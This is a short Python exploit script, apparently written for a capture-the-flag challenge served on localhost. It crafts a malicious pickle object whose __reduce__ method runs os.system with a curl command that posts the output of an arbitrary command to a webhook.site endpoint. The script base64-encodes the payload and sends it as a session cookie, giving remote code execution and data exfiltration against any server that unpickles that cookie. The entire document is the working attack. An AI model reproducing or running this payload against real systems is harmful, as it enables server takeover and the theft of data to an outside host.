import pickle
import base64
import requests
import os

class RCE:
    def __reduce__(self):
        # Command to be executed on the server
        cmd = 'curl -X POST --data-binary "$(YOUR_COMMAND_HERE)" https://webhook.site/<YOUR_TOKEN_HERE>'
        return (os.system, (cmd,))

# Create an instance of our RCE class
pickled = pickle.dumps(RCE())

# Base64 encode the pickled object
encoded_pickle = base64.b64encode(pickled).decode('utf-8')

# The URL of the challenge
url = 'http://localhost:5004' # Change port if necessary

# Set the malicious cookie
cookies = {'session': encoded_pickle}

# Send the request
response = requests.get(url, cookies=cookies)
